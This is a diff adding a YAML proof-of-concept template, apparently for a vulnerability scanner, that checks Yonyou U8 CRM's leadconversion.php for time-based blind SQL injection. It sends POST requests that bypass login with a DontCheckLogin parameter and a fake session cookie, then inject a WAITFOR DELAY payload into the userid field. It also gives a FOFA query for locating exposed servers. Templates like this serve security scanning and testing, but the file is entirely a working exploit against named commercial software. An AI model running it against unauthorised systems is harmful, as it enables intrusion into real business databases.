@@ -1,0 +1,31 @@
+id: poc-yaml-yongyon-u8-crm-leadconversion-sqli
+info:
+  name: 用友U8-CRM leadconversion.php SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: title="用友U8CRM"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /lead/leadconversion.php
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded
+  data: DontCheckLogin=1&Action=getDeptName&userid=1%27;WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  expression: "status_code == 200 && \ncontains(body,\"\\\"dept_name\\\":\") &&\n\
+    contains(body,\"\\\"dept_id\\\":\") &&\nduration >= t1 &&\nduration <= t2\n"
+- method: POST
+  path: /lead/leadconversion.php
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded
+  data: DontCheckLogin=1&Action=getDeptName&userid=1%27;WAITFOR+DELAY+%270:0:{{.t3}}%27--
+  expression: "status_code == 200 && \ncontains(body,\"\\\"dept_name\\\":\") &&\n\
+    contains(body,\"\\\"dept_id\\\":\") &&\nduration >= t3 &&\nduration <= t4\n"
+transport: http
